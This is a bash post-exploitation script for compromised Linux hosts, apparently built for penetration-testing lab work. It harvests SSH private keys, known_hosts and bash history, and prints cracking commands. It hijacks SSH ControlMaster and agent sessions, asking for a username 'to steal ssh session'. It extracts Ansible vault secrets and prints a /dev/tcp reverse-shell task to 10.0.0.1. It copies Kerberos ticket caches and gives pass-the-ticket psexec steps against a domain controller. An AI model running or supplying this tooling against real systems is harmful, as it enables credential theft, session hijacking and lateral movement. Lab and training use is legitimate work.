#!/bin/bash  

########################################
#### Linux post exploitation script ####
########################################

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
ENDCOLOR="\e[0m"

#####################
# Current user whoami
#####################
echo ""
echo -e "${GREEN}[+] Current user${ENDCOLOR}"
echo -e "   $(whoami | sed 's/root/\\e[31mroot\\e[0m/g')"
echo -e "   $(id| sed 's/root/\\e[31mroot\\e[0m/g')"

#####################
# Other users with home directory
#####################
echo ""
echo -e "${GREEN}[+] Other users with home directory${ENDCOLOR}"
home_users=($(ls /home))
for u in "${home_users[@]}"; do
    echo -e "   $u"
done



#####################
# Hostname and IP
#####################
echo ""
echo -e "${GREEN}[+] Hostname and IP${ENDCOLOR}"
echo $(hostname)

IP=$(hostname -i | awk '{print $NF}')
echo $IP
echo ""

ip a


#####################
# .bash_history
#####################
echo ""
echo -e "${GREEN}[+] Bash $USER history (default 10 lines)${ENDCOLOR}"
echo -e "  $(tail ~/.bash_history)"


###############
####  SSH  ####
###############

# ssh private keys #
echo ""
echo -e "${GREEN}[+] Checking SSH private keys${ENDCOLOR}"
 
#find /home/ -name "*.key" 2>/dev/null

if [ $(find /home/ -name "id_rsa" 2>/dev/null | wc -l) -lt 1 ] || [ $(grep -rl '\-\-\-BEGIN' /home/ | grep -rl 'PRIVATE'  | wc -l) -lt 1 ]; then
    echo -e "${RED}    [!] No private ssh keys found!${ENDCOLOR}"
fi
echo ""

for n in $(find /home/ -name "id_rsa" 2>/dev/null)
do
    echo "$n"
    # ENCRYPTED
    if $(cat $n | grep -q "ENCRYPTED") ; then
        echo -e "${RED}   Encrypted - copy keys to kali and decrypt${ENDCOLOR}"
        echo -e "${YELLOW}   python /usr/share/john/ssh2john.py user.key > user.hash ${ENDCOLOR}"
        echo -e "${YELLOW}   sudo john --wordlist=/usr/share/wordlist/rockyou.txt ./user.hash${ENDCOLOR}"
    fi
done


# checking for private keys with different name
for n in $(grep -rlE '\-\-\-BEGIN.*PRIVATE'  /home/ | grep -v 'id_rsa')
do
    if $(head -n 1 $n | grep  -qE '\-\-\-BEGIN.*PRIVATE') ; then 
        echo "$n"

        # ENCRYPTED
        if $(cat $n | grep -q "ENCRYPTED") ; then
            echo -e "${RED}   Encrypted - copy keys to kali and decrypt${ENDCOLOR}"
            echo -e "${YELLOW}   python /usr/share/john/ssh2john.py user.key > user.hash ${ENDCOLOR}"
            echo -e "${YELLOW}   sudo john --wordlist=/usr/share/wordlist/rockyou.txt ./user.hash${ENDCOLOR}"
        fi
    fi
done



# SSH known_hosts #
echo ""
echo -e "${GREEN}[+] Checking SSH known_hosts${ENDCOLOR}"
HashedHosts="$(cat /etc/ssh/ssh_config | grep 'HashKnownHosts')"
if (echo $HashedHosts | grep -v "#" | grep -q "yes") ; then
    echo -e "${RED}    [!] known_hosts hashed${ENDCOLOR}"
    cat /etc/ssh/ssh_config | grep 'HashKnownHosts'
    for n in $(find /home/ -name "known_hosts" 2>/dev/null)
    do
        echo -e "   ${BLUE}$n${ENDCOLOR}"
        cat $n 
    done
else
    echo -e "${RED}    [!]${ENDCOLOR} ${YELLOW}known_hosts not hashed${ENDCOLOR}"
    cat /etc/ssh/ssh_config | grep 'HashKnownHosts'
    for n in $(find /home/ -name "known_hosts" 2>/dev/null)
    do
        echo -e "   ${BLUE}$n${ENDCOLOR}"
        echo -e "${RED}    [!]${ENDCOLOR} ${YELLOW}Try SSH to${ENDCOLOR} ${RED}$(cat $n | cut -d ' ' -f1) ${YELLOW}host with id_rsa private key${ENDCOLOR}"
        cat $n 
    done
fi

# SSH authorized_keys #
echo ""
echo -e "${GREEN}[+] Checking SSH authorized_keys${ENDCOLOR}"

for auth_keys_file in $(find /home/ -name "authorized_keys" 2>/dev/null)
do
    echo -e "   ${BLUE}$auth_keys_file${ENDCOLOR}"
    out="   "
    for n in $(cat $auth_keys_file)
    do
        if $(echo $n | grep -q -v '@'); then
            out+=" $n"
        else
            if $(echo $n | grep -q -v $(whoami)); then
                out+=" ${RED}$n${ENDCOLOR}"
                u=$(echo $n | cut -d '@' -f1)
                h=$(echo $n | cut -d '@' -f2)
                echo -e "   ${RED}[!]${ENDCOLOR} ${YELLOW}Different users key. Try to connect with${ENDCOLOR} ${RED}$u${ENDCOLOR} ${YELLOW}user id_rse key from ${RED}$h${ENDCOLOR} ${YELLOW}host as different users. Try root, $(ls /home | tr '\n' ',\s').${ENDCOLOR}"
                echo -e "$out"
                out="   "
            else
                out+=" $n"
                echo -e "$out"
                out="   "
            fi
        fi
    done
done 

if [ $(find /home/ -name "authorized_keys" 2>/dev/null | wc -l) -lt 1 ]; then
    echo -e "${RED}   [!] No authorized_keys files was found - ${ENDCOLOR}${YELLOW}can create own with public key!${ENDCOLOR}"
fi



# SSH Hijackiing with Contromaster #
echo ""
echo -e "${GREEN}[+] SSH hijacking with ControlMaster${ENDCOLOR}"
for controlmaster_dir in $(find /home/ -iname "controlmaster" -type d 2>/dev/null)
do
    echo -e "   ${BLUE}$controlmaster_dir${ENDCOLOR}"
    echo -e "${RED}   [!]${ENDCOLOR} ${YELLOW}ControlMaster path exits!${ENDCOLOR}"
    echo -e "${RED}   [+]${ENDCOLOR} ${YELLOW}Current sessions on machine - monitor directory, ssh connection may diseapear!${ENDCOLOR}"
    ls -la $controlmaster_dir
    echo -e "   ${RED}[>] If root:${ENDCOLOR} ${YELLOW}ssh -S /home/offsec/.ssh/controlmaster/offsec\@linuxvictim\:22 offsec@linuxvictim${ENDCOLOR}"
    
    if [ $(ls $controlmaster_dir | wc -l) -lt 1 ]; then
        echo -e "   ${RED}[>] Else:${ENDCOLOR} ${YELLOW}ssh offsec@linuxvictim${ENDCOLOR}"
    else
        for session in $(ls $controlmaster_dir)
        do
            echo -e "   ${RED}[>] Else:${ENDCOLOR} ${YELLOW}ssh $(echo $session | cut -d ':' -f1)${ENDCOLOR}"
        done
    fi
 
done

if [ $(find /home/ -iname "controlmaster" -type d 2>/dev/null | wc -l) -lt 1 ]; then
    echo -e "${RED}   [!] No ControlMaster path${ENDCOLOR}"
fi


#  SSH hijacking with SSH Agent #
echo ""
echo -e "${GREEN}[+] SSH hijacking with SSH Agent and SSH agent forwarding${ENDCOLOR}"

if (cat /etc/ssh/sshd_config | grep AllowAgentForwarding | grep -q "#" ); then
    echo -e "${RED}   [!] AllowAgentForwarding commented in th sshd_config file${ENDCOLOR}"
else
    echo -e "${GREEN}   [!] AllowAgentForwarding enabled in th sshd_config file${ENDCOLOR}"
    echo -e "${RED}   [!] If no root just connect with SSH to active session, if root:${ENDCOLOR}"
    
    ps aux | grep ssh
    # get user name"
    read -p "Enter username to steal ssh session: " username
    pstree -p $username | grep ssh
    PIDS=$(pstree -p $username | grep ssh | grep bash | awk -F'---' '{print $NF}' | grep -o '[0-9]*')
 
    for p in $PIDS
    do
        echo -e "${YELLOW}   [+] Reading $p PID data ${ENDCOLOR}"
        cat /proc/$p/environ | grep -a -o 'SSH_AUTH_SOCK.*'
        res=$(cat /proc/$p/environ| grep -a -o 'SSH_AUTH_SOCK.*')
        echo -e "${YELLOW}   [!] To steal session execute commands as root:${ENDCOLOR}"
        echo -e "${YELLOW}   [>] $res ssh-add -l${ENDCOLOR}"
        echo -e "${YELLOW}   [>] $res ssh $username@linuxvictim${ENDCOLOR}"
    done
fi


############################
####  DevOps - Ansible  ####
############################
echo ""
echo -e "${GREEN}[+] Ansible enumeration${ENDCOLOR}"

ansible --version

if [ -d /etc/ansible ]; then
    echo -e "${RED}   [!]${ENDCOLOR} ${YELLOW}Could be ansible controller!${ENDCOLOR}"
    echo -e "${RED}   [!]${ENDCOLOR} ${YELLOW}Directory /etc/ansible exist.${ENDCOLOR}"
    echo -e "${BLUE}   /etc/ansible/hosts${ENDCOLOR}"
    cat /etc/ansible/hosts
    echo -e "${BLUE}   /etc/passwd${ENDCOLOR}"
    cat /etc/passwd | grep ansi

    echo -e "${GREEN}[+] Ansible Ad-hock commands${ENDCOLOR}"
    echo -e "${Yellow}   ansible <group name> -a "whoami" --become${ENDCOLOR}"

    echo -e "${GREEN}[+] Ansible playbooks${ENDCOLOR}"
    echo -e "${GREEN}   [+] List playbooks${ENDCOLOR}"

    for playbook in $(find /opt/ansible /opt/playbooks -name "*.yaml" 2>/dev/null)
    do
        echo -e "${BLUE}   $playbook${ENDCOLOR}"
        echo -e "${GREEN}   [+] Ansible playbooks checking hardcoded credentials${ENDCOLOR}"
        cat $playbook
        if (cat $playbook| grep "become_user\|become_pass" | grep -q "vault"); then
            echo -e "${RED}   [!]${ENDCOLOR} ${YELLOW}Credentials are vaulted${ENDCOLOR}"
            echo -e "${YELLOW}   [>] Copy encrypted data to file test.yaml, remove spaces and save it on kali${ENDCOLOR}"
            cat $playbook | grep -i "ansible_vault\|[0-9]" | tr -d ' '  
            cat $playbook | grep -i "ansible_vault\|[0-9]" | tr -d ' ' > pw.txt
            echo -e "${YELLOW}   [>] Decrypt vault password: ${ENDCOLOR}"
            echo -e "       python /usr/share/john/ansible2john.py ./test.yaml | cut -d ':' -f2 > testhash.txt "
            echo -e "       hashcat testhash.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt"
            echo -e "${YELLOW}   [>] Decrypt password on victim${ENDCOLOR}"
            echo -e "       cat pw.txt | ansible-vault decrypt"
        else
            cat $playbook | grep "become_user\|become_pass" 
        fi

        echo -e "${GREEN}   [+] Ansible playbooks file permissions${ENDCOLOR}"
        if [ -w $playbook ]; then
            echo -e "${RED}   [!] $playbook${ENDCOLOR} ${YELLOW}is writeable${ENDCOLOR}"
            echo -e "${YELLOW}   [>] Add become: yes${ENDCOLOR}"
            echo -e "${YELLOW}   [>] Run shell commands from playbook${ENDCOLOR}"
            echo -e "${YELLOW}- name: Run command
               shell: /bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
               asunc: 10
               poll: 0${ENDCOLOR}"
        else
            echo -e "${RED}   [!] $playbook is not writeable${ENDCOLOR}"
        fi
    done

else
    echo -e "${RED}   [!] Directory /etc/ansible does not exist.${ENDCOLOR}"
fi


# syslog for ansible $
echo -e "${GREEN}   [+] Checking syslog file${ENDCOLOR}"
if test -d /var/log/syslog; then
    echo -e "${RED}   [!]${ENDCOLOR} ${Yellow}Could be ansible Ansible node!${ENDCOLOR}"
    echo -e "${RED}   [!]${ENDCOLOR} ${Yellow}File /var/log/syslog exists${ENDCOLOR}"
    cat /etc/passwd | grep ansi

    echo -e "${GREEN}   [+] Reading /var/log/syslog${ENDCOLOR}"
    cat /var/log/syslog | grep "ssh\|pass\|cred\|pwd"
else
    echo -e "${RED}   [!] File /var/log/syslog does not exist.${ENDCOLOR}"
fi



############################
####  Kerberos on Linux ####
############################
echo ""
echo -e "${GREEN}[+] Kerberos on Linux${ENDCOLOR}"
if (ls /etc | grep -q krb); then
    echo -e "${RED}   [!]${ENDCOLOR} ${YELLOW}Kerberos installed${ENDCOLOR}"

# Keytab #
    echo ""
    echo -e "${GREEN}   [+] Checking Keytab files${ENDCOLOR}"
    #cat /etc/crontab | grep ".keytab"
    if [ $(find / -path /etc -prune -o -name "*.keytab" 2>/dev/null | grep keytab | wc -l) -lt 1 ]; then
        echo -e "${RED}   [!] No .keytab files was found.${ENDCOLOR}"
    else
        echo -e "${RED}   [!]${ENDCOLOR} ${Yellow}keytab files found!${ENDCOLOR}"
        echo -e "${Yellow}      [>] Use Keytab files${ENDCOLOR}"
        echo -e "${Yellow}      kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab${ENDCOLOR}"
        echo -e "${Yellow}      kinit -R${ENDCOLOR}"
        echo -e "${Yellow}      smbclient -k -U "CORP1.COM\\administrator" //DC01.CORP.COM/C\$${ENDCOLOR}"
    fi

    for keytab in $(find / -path /etc -prune -o -name "*.keytab" 2>/dev/null | grep keytab)
    do
        echo -e "${BLUE}    $keytab${ENDCOLOR}"
    done


# Cache Credentials krb5cc files #
    echo ""
    echo -e "${GREEN}   [+] Checking Cached Credentials${ENDCOLOR}"
    echo -e "${RED}   [!]${ENDCOLOR} ${YELLOW}Checking env variables for KRB5CCNAME${ENDCOLOR}"
    env | grep 'KRB5CCNAME*' #| cut -d ':' -f2 | cut -d '_' -f1

    if [ $(find / -name "krb5cc*" 2>/dev/null | wc -l) -lt 1 ]; then
        echo -e "${RED}   [!] No cached credentials krb5cc_* files was found.${ENDCOLOR}"
    else
        echo -e "${RED}   [!]${ENDCOLOR} ${YELLOW}Cached credentials krb5cc_* files found.${ENDCOLOR}"
    fi

    count=0
    for krb5ccname in $(find / -name "krb5cc*" 2>/dev/null)
    do
        echo -e "${BLUE}    $krb5ccname${ENDCOLOR}"
        echo -e "${Yellow}      [>] Copy file: sudo cp $krb5ccname /tmp/krb5cc_copy_$count ${ENDCOLOR}"
        cp $krb5ccname /tmp/krb5cc_copy_$count

        echo -e "${RED}   [!]${ENDCOLOR} ${YELLOW}Use $krb5ccname locally${ENDCOLOR}"
        echo -e "${Yellow}      [>] sudo chown offsec:offsec /tmp/krb5cc_copy_$count${ENDCOLOR}"
        echo -e "${Yellow}      [>] Use ccache: export KRB5CCNAME=/tmp/krb5cc_copy_$count${ENDCOLOR}"
        echo -e "${Yellow}      [>] klist ${ENDCOLOR}"
        echo -e "${Yellow}      [>] kvno service to use ${ENDCOLOR}"

        echo -e "${RED}   [!]${ENDCOLOR} ${YELLOW}Kerberos with Impacket${ENDCOLOR}"
        echo -e "${Yellow}      [>] Download copied file${ENDCOLOR}"
        echo -e "${Yellow}      [>] scp offsec@linuxvictim:/tmp/krb5cc_copy_$count /tmp/krb5cc_copy${ENDCOLOR}"
        echo -e "${Yellow}      [>] OR: cat /tmp/krb5cc_copy_$count | base64 -w0 ${ENDCOLOR}"
        echo -e "${Yellow}      [>] On Kali: export KRB5CCNAME=/tmp/krb5cc_copy${ENDCOLOR}"
        echo -e "${Yellow}      [>] Add domain controller to /etc/hosts${ENDCOLOR}"
        echo -e "${Yellow}          host corp1.com (domain)${ENDCOLOR}"
        echo -e "${Yellow}          192.168.120.5 CORP1.COM DC01.CORP1.COM${ENDCOLOR}"
        echo -e "${Yellow}      [>] Comment proxy_dns in /etc/proxychains.conf (on kali)${ENDCOLOR}"
        echo -e "${Yellow}      [>] Start socks proxy to server from which ccache was copied${ENDCOLOR}"
        echo -e "${Yellow}          [ssh offsec@linuxvictim -D 9050${ENDCOLOR}"
        echo -e "${Yellow}      [>] psexec:${ENDCOLOR}"
        echo -e "${Yellow}          proxychains -q python3 /usr/share/doc/python3-impacket/examples/psexec.py username@DC01.CORP1.COM -k -no-pass${ENDCOLOR}"
        count+=1
    done

else
    echo -e "${RED}   [!] Kerberos not installed${ENDCOLOR}"
fi

echo ""
echo -e "${GREEN}### THE END OF THE SCRIPT ###${ENDCOLOR}"